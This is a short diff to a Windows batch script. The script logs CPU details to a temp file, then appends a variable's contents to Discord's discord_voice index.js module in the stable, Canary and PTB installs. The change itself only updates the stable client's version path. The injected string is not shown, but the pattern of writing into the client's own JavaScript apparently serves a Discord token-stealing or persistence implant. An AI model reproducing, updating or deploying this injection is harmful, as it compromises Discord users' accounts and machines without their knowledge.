@@ -23,11 +23,11 @@ echo.
 echo. 
 echo CPU:>>C:\temp\System_INFO.txt
 wmic cpu get name>>C:\temp\System_INFO.txt
-set "discord=%appdata%\discord\0.0.308\modules\discord_voice\index.js"
+set "discord=%appdata%\discord\0.0.309\modules\discord_voice\index.js"
 set "discordcanary=%appdata%\discordcanary\0.0.276\modules\discord_voice\index.js"
 set "discordptb=%appdata%\discordptb\0.0.55\modules\discord_voice\index.js"
 if not exist %discord% goto CANARY
-echo %str% >> "%appdata%\discord\0.0.308\modules\discord_voice\index.js"
+echo %str% >> "%appdata%\discord\0.0.309\modules\discord_voice\index.js"
 GOTO CANARY
 :CANARY
 if not exist %discordcanary% goto PTB
